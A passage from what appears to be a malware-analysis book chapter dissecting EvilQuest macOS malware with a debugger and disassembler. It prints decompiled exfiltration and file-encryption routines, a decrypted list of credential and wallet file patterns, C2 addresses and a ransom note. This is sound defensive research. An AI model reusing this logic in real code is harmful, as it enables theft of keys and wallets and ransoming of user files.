step over the call to `lfsc_dirlist` in the following debugger output, we can see that the function returns this recursive directory listing, which indeed starts at `\"/Users\"` ([Listing 11-58](#listing11-58)):    ``` # **lldb /Library/mixednkey/toolroomd** ...  (lldb) **b 0x000000010000171e** Breakpoint 1: where = toolroomd`toolroomd[0x000000010000171e], address = 0x000000010000171e  (lldb) **c**  * thread #4, stop reason = breakpoint 1.1 ->  0x10000171e: callq  lfsc_dirlist  (lldb)**ni**  (lldb) **x/s $rax** 0x10080bc00:   \"/Users/user   /Users/Shared   /Users/user/Music   /Users/user/.lldb   /Users/user/Pictures   /Users/user/Desktop   /Users/user/Library   /Users/user/.bash_sessions   /Users/user/Public   /Users/user/Movies   /Users/user/.Trash   /Users/user/Documents   /Users/user/Downloads   /Users/user/Library/Application Support   /Users/user/Library/Maps   /Users/user/Library/Assistant   ... ```    Listing 11-58: The generated (recursive) directory listing    If you consult the disassembly, you’ll be able to see that this directory listing is then sent to the attacker’s command and control server via a call to the malware’s `ei_forensic_sendfile` function.    ### Certificate and Cryptocurrency File Exfiltration    Once the infected system’s directory listing has been exfiltrated, EvilQuest once again invokes the `get_targets` function. Recall that, given a root directory such as */Users*, the `get_targets` function recursively generates a list of files. For each file encountered, the malware applies a callback function to check whether the file is of interest. In this case, `get_targets` is invoked with the `is_lfsc_target` callback:    ``` rax = get_targets(rax, &var_18, &var_1C, **is_lfsc_target**);  ```    In [Listing 11-59](#listing11-59)’s abridged decompilation, note that the `is_lfsc_target` callback function invokes two helper functions, `lfsc_parse_template` and `is_lfsc_target`, to determine if a file is of interest:    ``` int is_lfsc_target(char* file) {       memcpy(&templates, 1 0x100013330, 0x98);     isTarget = 0x0;     length = strlen(file);     index = 0x0;     do {             if(isTarget) break;             if(index >= 0x13) break;              template = ei_str(templates+index*8);             parsedTemplate = lfsc_parse_template(template);             if(lfsc_match(parsedTemplate, file, length) == 0x1)              {                isTarget = 0x1;             }              index++;      } while (true);      return isTarget; } ```    Listing 11-59: Core logic of the `is_lfsc_target` function    From this decompilation, we can also see that the templates used to determine if a file is of interest are loaded from `0x100013330` 1. If we check this address, we find a list of encrypted strings, shown in [Listing 11-60](#listing11-60):    ``` 0x0000000100013330    dq   0x0000000100010a95 ; \"2Y6ndF3HGBhV3OZ5wT2ya9se0000053\", 0x0000000100013338    dq   0x0000000100010ab5 ; \"3mkAT20Khcxt23iYti06y5Ay0000083\" 0x0000000100013340    dq   0x0000000100010ad5 ; \"3mTqdG3tFoV51KYxgy38orxy0000083\" 0x0000000100013348    dq   0x0000000100010af5 ; \"2Glxas1XPf4|11RXKJ3qj71m0000023\" ... ```    Listing 11-60: Encrypted list of files of “interest”    Thanks to our injected decryptor library, we have the ability to decrypt this list ([Listing 11-61](#listing11-61)):    ``` % **DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib /Library/mixednkey/toolroomd** **... decrypted string (0x100010a95): *id_rsa*/i decrypted string (0x100010ab5): *.pem/i decrypted string (0x100010ad5): *.ppk/i decrypted string (0x100010af5): known_hosts/i decrypted string (0x100010b15): *.ca-bundle/i decrypted string (0x100010b35): *.crt/i decrypted string (0x100010b55): *.p7!/i decrypted string (0x100010b75): *.!er/i decrypted string (0x100010b95): *.pfx/i decrypted string (0x100010bb5): *.p12/i decrypted string (0x100010bd5): *key*.pdf/i decrypted string (0x100010bf5): *wallet*.pdf/i decrypted string (0x100010c15): *key*.png/i decrypted string (0x100010c35): *wallet*.png/i decrypted string (0x100010c55): *key*.jpg/i decrypted string (0x100010c75): *wallet*.jpg/i decrypted string (0x100010c95): *key*.jpeg/i decrypted string (0x100010cb5): *wallet*.jpeg/i ...** ```   **Listing 11-61: Decrypted list of files of “interest”    From the decrypted list, we can see that EvilQuest has a propensity for sensitive files, such as certificates and cryptocurrency wallets and keys!    Once the `get_targets` function returns a list of files that match these templates, the malware reads each file’s contents via a call to `lfsc_get_contents` and then exfiltrates the contents to the command and control server using the `ei_forensic_sendfile` function ([Listing 11-62](#listing11-62)):    ``` get_targets(\"/Users\", &targets, &count, is_lfsc_target);  for (index = 0x0; index < count; ++index) {        targetPath = targets[index];        lfsc_get_contents(targetPath, &targetContents, &targetContentSize);       ei_forensic_sendfile(targetContents, targetContentSize, ...);        ... ```    Listing 11-62: File exfiltration via the `ei_forensic_sendfile` function    We can confirm this logic in a debugger by creating a file on the desktop named *key.png* and setting a breakpoint on the call to `lfsc_get_contents` at `0x0000000100001965`. Once the breakpoint is hit, we print out the contents of the first argument (`RDI`) and see that, indeed, the malware is attempting to read and then exfiltrate the *key.png* file ([Listing 11-63](#listing11-63)):    ``` # **lldb /Library/mixednkey/toolroomd** ...  (lldb) **b 0x0000000100001965** Breakpoint 1: where = toolroomd`toolroomd[0x0000000100001965], address = 0x0000000100001965  (lldb) **c**  * thread #4, stop reason = breakpoint 1.1 ->  0x100001965: callq  lfsc_get_contents  (lldb) **x/s $rdi** 0x1001a99b0: \"/Users/user/Desktop/key.png\" ```    Listing 11-63: Observing file exfiltration logic via the debugger    Now we know that if a user becomes infected with EvilQuest, they should assume that all of their certificates, wallets, and keys belong to the attackers.    ## File Encryption Logic    Recall that Dinesh Devadoss, the researcher who discovered EvilQuest, noted that the malware contained ransomware capabilities. Let’s continue our analysis efforts by focusing on this ransomware logic. You can find the relevant code from the main function, where the malware invokes a method named `s_is_high_time` and then waits on several timers to expire before kicking off the encryption logic, which begins in a function named `ei_carver_main` ([Listing 11-64](#listing11-64)):    ``` if ( (s_is_high_time(var_80) != 0x0) &&       ( ( (ei_timer_check(var_70) == 0x1) &&           (ei_timer_check(var_130) == 0x1)) &&           (var_11C < 0x2))) {          ...          ei_carver_main(*var_10, &var_120); ```    Listing 11-64: Following timer checks, the `ei_carver_main` function is invoked.    Of particular note is the `s_is_high_time` function, which invokes the `time` API function and then compares the returned time epoch with the hardcoded value `0x5efa01f0`. This value resolves to Monday, June 29, 2020 15:00:00 GMT. If the date on an infected system is before this, the function will return a `0`, and the file encryption logic will not be invoked. In other words, the malware’s ransomware logic will only be triggered at or after this date and time.    If we take a look at the `ei_carver_main` function’s disassembly at `0x000000010000ba50`, we can see it first generates the encryption key by calling the `random` API, as well as functions named `eip_seeds` and `eip_key`. Following this, it invokes the `get_targets` function. Recall that this function recursively generates a list of files from a root directory by using a specified callback function to filter the results. In this instance, the root directory is */Users*.    The callback function, `is_file_target`, will only match certain file extensions. You can find this encrypted list of extensions hardcoded within the malware at `0x000000010001299e`. Using our injectable decryptor library, we can recover this rather massive list of target file extensions, which includes *.zip*, *.dmg*, *.pkg*, *.jpg*, *.png*, *.mp3*, *.mov*, *.txt*, *.doc*, *.xls*, *.ppt*, *.pages*, *.numbers*, *.keynote*, *.pdf*, *.c*, *.m*, and more.    After it has generated a list of target files, the malware completes a key-generation process by calling `random_key`, which in turn calls `srandom` and `random`. Then the malware calls a function named `carve_target` on each target file, as seen in [Listing 11-65](#listing11-65):    ``` result = get_targets(\"/Users\", &targets, &count, is_file_target); if (result == 0x0) {       key = random_key();       for (index = 0x0; index < count; index++) {          carve_target(targets[i], key, ...);        }     } ```    Listing 11-65: Encrypting (ransoming) target files    The `carve_target` function takes the path of the file to encrypt and various encryption key values. If we analyze the disassembly of the function or step through it in a debugging session, we’ll see that it performs the following actions to encrypt each file:    1.  Makes sure the file is accessible via a call to `stat` 2.  Creates a temporary filename by calling a function named `make_temp_name` 3.  Opens the target file for reading 4.  Checks if the target file is already encrypted with a call to a function named `is_carved`, which checks for the presence of `0xddbebabe` at the end of the file 5.  Opens the temporary file for writing 6.  Reads `0x4000`-byte chunks from the target file 7.  Invokes a function named `tpcrypt` to encrypt the `0x4000` bytes 8.  Writes out the encrypted bytes to the temporary file 9.  Repeats steps 6–8 until all bytes have been read and encrypted from the target file 10.  Invokes a function named `eip_encrypt` to encrypt keying information, which is then appended to the temporary file 11.  Writes `0xddbebabe` to the end of the temporary file 12.  Deletes the target file 13.  Renames the temporary file to the target file    Once EvilQuest has encrypted all files that match file extensions of interest, it writes out the text in [Figure 11-2](#figure11-2) to a file named *READ_ME_NOW.txt*.  ![The text in READ_ME_NOW.txt is as follows:  “YOUR IMPORTANT FILES ARE ENCRYPTED.  Many of your documents, photos, videos, images and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your file without our decryption service. We use 256-bit AES algorithm so it will take you more than a billion years to break this encryption without knowing the key (you can read Wikipedia about AES if you don’t believe this statement). Anyways, we guarantee that you can recover your files safely and easily. This will require us to use some processing power, electricity and storage on our side, so there’s a fixed processing fee of 50 USD. This is a one-time payment, no additional fees included. In order to accept this offer, you have to deposit payment within 72 hours (3 days) after receiving this message, otherwise this offer will expire and you will lose your files forever. Payment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the moment of payment. The address you have to make payment to is: 13roGMpWd7Pb3ZoJyce8eo0pfeg0vGHHK7\\. Decryption will start automatically within 2 hours after the payment has been processed and will take from 2 to 5 hours depending on the processing power of your computer. After that all of your files will be restored. THIS OFFER IS VALID FOR 72 HOURS AFTER RECEIVING THIS MESSAGE.”](image_fi/501942c11/f11002.png)    Figure 11-2: EvilQuest’s ransom note      To make sure the user reads this file, the malware also displays a modal prompt and reads it aloud via macOS’s built-in `say` command.    If you peruse the code, you might notice a function named `uncarve_target`, implemented at `0x000000010000f230`, that is likely responsible for restoring ransomed files. Yet this function is never invoked. That is to say, no other code or logic references this function. You can confirm this by searching Hopper (or another disassembly tool) for references to the function’s address. As no such cross-references are found, it appears that paying the ransom won’t actually get you your files back. Moreover, the ransom note does not include any way to communicate with the attacker. As Phil Stokes put it, “there’s no way for you to tell the threat actors that you paid; no request for your contact address; and no request for a sample encrypted file or any other identifying factor.”^([5](#c11-endnote-5))    Luckily for EvilQuest victims, researchers at SentinelOne reversed the cryptographic algorithm used to encrypt files and found a method of recovering the encryption key. In a write-up, Jason Reaves notes that the malware writers use symmetric key encryption, which relies on the same key to both encrypt and decrypt the file; moreover, “the cleartext key used for encoding the file encryption key ends up being appended to the encoded file encryption key.”^([6](#c11-endnote-6)) Based on their findings, the researchers were able to create a full decryptor, which they publicly released.    ## EvilQuest Updates    Often malware specimens evolve, and defenders will discover new variants of them in the wild. EvilQuest is no exception. Before wrapping up our analysis of this insidious threat, let’s briefly highlight some changes found in later versions of EvilQuest (also called ThiefQuest). You can read more about these differences in a Trend Micro write-up titled “Updates on Quickly-Evolving ThiefQuest macOS Malware.”^([7](#c11-endnote-7))    ### Better Anti-Analysis Logic    The Trend Micro write-up notes that later versions of EvilQuest contain “improved” anti-analysis logic. First and foremost, its function names have been obfuscated. This slightly complicates analysis efforts, as the function names in older versions were quite descriptive.    For example, the string decryption function `ei_str` has been renamed to `52M_rj`. We can confirm this by looking at the disassembly in the updated version of the malware ([Listing 11-66](#listing11-66)), where we see that at various locations in the code, `52M_rj` takes an encrypted string as its parameter:    ``` 0x00000001000106a5    lea   rdi, qword [a2aawvq0k9vm01w] ; \"2aAwvQ0k9VM01w...\" 0x00000001000106ac    call  52M_rj  ... 0x00000001000106b5    lea   rdi, qword [a3zi8j820yphd00] ; \"3zI8J820YPhd00...\" 0x00000001000106bc    call  52M_rj ```    Listing 11-66: Obfuscated function names    A quick triage of the `52M_rj` function confirms it contains the core logic to decrypt the malware’s embedded strings.    Another approach to mapping the old version of functions to their newer versions is by checking the system API calls they invoke. Take, for example, the `NSCreateObjectFileImageFromMemory` and `NSLinkModule` APIs that `EvilQuest` invokes as part of its in-memory payload execution logic. In the old version of the malware, we find these APIs invoked in a descriptively named function `ei_run_memory_hrd`, found at address `0x0000000100003790`. In the new version, when we come across a cryptically named function `52lMjg` that invokes these same APIs, we know we’re looking at the same function. In our disassembler, we can then rename `52lMjg` to `ei_run_memory_hrd`.    Moreover, in the old version of the malware, we know that the `ei_run_memory_hrd` function was invoked solely by a function named `react_exec`. You can check this by looking for references to the function in Hopper ([Figure 11-3](#figure11-3)).  ![In Hopper, a search for “References to 0x100003790” results in the address “0x10000a1cd (__react_exec + 0x5d)” with the value “call    _ei_run_memory_hrd.”](image_fi/501942c11/f11003.png)    Figure 11-3: Cross-references to the `ei_run_memory_hrd` function      Now we can posit that the single cross-reference caller of the `52lMjg` function, named `52sCg`, is actually the `react_exec` function. This cross-reference method allows us to easily replace the non-descriptive names found in the new variant with their far more descriptive original names.    The malware authors also added other anti-analysis logic. For example, in the `ei_str` function (the one they renamed `52M_rj`), we find various additions, including anti-debugger logic. The function now makes a system call to `ptrace` (`0x200001a`) with the infamous `PT_DENY_ATTACH` value (`0x1f`) to complicate debugging efforts ([Listing 11-67](#listing11-67)):    ``` 52M_rj: 0x0000000100003020    push       rbp 0x0000000100003021    mov        rbp, rsp ... 0x0000000100003034    mov        rcx, 0x0 0x000000010000303b    mov        rdx, 0x0 0x0000000100003042    mov        rsi, 0x0 0x0000000100003049    mov        rdi, 0x1f 0x0000000100003050    mov        rax, 0x200001a 0x0000000100003057    syscall ```    Listing 11-67: Newly added anti-debugging logic    Trend Micro also notes that the detection logic in the `is_virtual_mchn` function has been expanded to more effectively detect analysts using virtual machines. The researchers write,    > In the function `is_virtual_mchn()`, condition checks including getting the MAC address, CPU count, and physical memory of the machine, have been increased.^([8](#c11-endnote-8))    ### Modified Server Addresses    Besides updates to anti-analysis logic, some of the strings found hardcoded and obfuscated in the malware’s binary have been modified. For example, the malware’s lookup URL for its command and control server and backup address have changed. Our injectable decryption library now returns the following for those strings:    ``` % **DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE**  ... decrypted string (0x106e9e154): lemareste.pythonanywhere.com decrypted string (0x106e9f7ca): 159.65.147.28 ```    ### A Longer List of Security Tools to Terminate    The list of security tools that the malware attempts to terminate has been expanded to include certain Objective-See tools created by yours truly. As these tools have the ability to generically detect EvilQuest, it is unsurprising that the malware now looks for them ([Listing 11-68](#listing11-68)):    ``` % **DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE** ... decrypted string (0x106e9f964): ReiKey decrypted string (0x106e9f978): KnockKnock ```    Listing 11-68: Additional “unwanted” programs, now including my very own ReiKey and KnockKnock    ### New Persistence Paths    Paths related to persistence have been added, perhaps as a way to thwart basic detection signatures that sought to uncover EvilQuest infections based on the existing paths ([Listing 11-69](#listing11-69)):    ``` % **DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE**  ... decrypted string (0x106e9f2ed): /Library/PrivateSync/com.apple.abtpd decrypted string (0x106e9f331): abtpd  decrypted string (0x106e9f998): com.apple.abtpd ```    Listing 11-69: Updated persistence paths    ### A Personal Shoutout    Recall that the `react_ping` command expects a unique string from the server. If it receives this string, it returns a success. In the updated version of EvilQuest, this function now expects a different encrypted string: `\"1D7KcC3J{Quo3lWNqs0FW6Vt0000023\"`, which decrypts to “Hello Patrick” ([Figure 11-4](#figure11-4)).^([9](#c11-endnote-9))  ![A tweet from Myrtus (@Myrtus0x0) that says, “@patrickwardle think you’re getting called out my man” and has a picture attached of EvilQuest’s encrypted string decrypting to “Hello Patrick.”](image_fi/501942c11/f11004.png)    Figure 11-4: An interesting observation      Apparently the EvilQuest authors were fans of my early “OSX.EvilQuest Uncovered” blog posts!^([10](#c11-endnote-10))    ### Better Functions    Other updates include improvements to older functions, particularly those that weren’t fully implemented as well as many new functions:    *   `react_updatesettings`: Used for retrieving updated settings from the command and control server *   `ei_rfind_cnc` and `ei_getip`: Generates pseudo-random IP addresses that will be used as the command and control server if they’re reachable *   `run_audio` and `run_image`: First saves an audio or image file from the server into a hidden file and then runs the `open` command to open the file with the default applications associated with the file    ### Removed Ransomware Logic    Interestingly the Trend Micro researchers also noted that a later version of EvilQuest removed its ransomware logic. This may not be too surprising; recall that the ransomware logic was flawed, allowing users to recover encrypted files without having to pay the ransom. Moreover, it appeared that the malware authors reaped no financial gains from this scheme. Phil Stokes wrote that “the one known Bitcoin address common to all the samples has had exactly zero transactions.”^([11](#c11-endnote-11))    In their report, the Trend Micro researchers argue that the malware authors are likely to release new versions of EvilQuest:    > Newer variants of [the EvilQuest malware] with more capabilities are released within days. Having observed this, we can assume that the threat actors behind the malware still have many plans to improve it. Potentially, they could be preparing to make it an even more vicious threat. In any case, it is certain that these threat actors act fast, whatever their plans. Security researchers should be reminded of this and strive to keep up with the malware’s progress by continuously detecting and blocking whatever variants cybercriminals come up with.^([12](#c11-endnote-12))    As a result, we’re likely to see more from EvilQuest!    ## Conclusion    EvilQuest is an insidious multifaceted threat, armed with anti-analysis mechanisms aimed at thwarting any scrutiny. However, as illustrated in the previous chapter, once such mechanisms are identified, they are rather trivial to wholly circumvent.    With the malware’s anti-analysis efforts defeated, in this chapter we turned to a myriad of static and dynamic analysis approaches to uncover the malware’s persistence mechanisms and gain a comprehensive understanding of its viral infection capabilities, file exfiltration logic, remote tasking capabilities, and ransomware logic.    In the process, we highlighted how to effectively utilize, in conjunction, arguably the two most powerful tools available to any malware analyst: the disassembler and the debugger. Against these tools, the malware stood no chance!    ## Endnotes**````"]